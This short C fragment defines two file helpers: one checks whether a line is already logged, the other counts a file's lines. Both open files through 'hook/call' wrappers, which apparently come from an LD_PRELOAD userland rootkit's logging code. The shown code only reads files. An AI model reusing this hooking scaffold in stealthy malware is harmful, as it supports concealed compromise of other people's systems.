int alreadylogged(const char *logpath, char *logbuf){
    FILE *fp;
    char line[LINE_MAX];
    int logged = 0;

    hook(CFOPEN);

    fp = call(CFOPEN, logpath, "r");
    if(fp == NULL && errno == ENOENT)
        return 0; // create the file..
    else if(fp == NULL) return 1;

    memset(line, 0, sizeof(line));
    while(fgets(line, sizeof(line), fp) != NULL && logged != 1)
        if(!strcmp(line, logbuf))
            logged = 1;

    fclose(fp);
    return logged;
}

int logcount(const char *path){
    FILE *fp;
    char buf[LINE_MAX];
    int count=0;

    hook(CFOPEN);

    fp = call(CFOPEN, path, "r");
    if(fp == NULL) return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL)
        count++;

    fclose(fp);
    return count;
}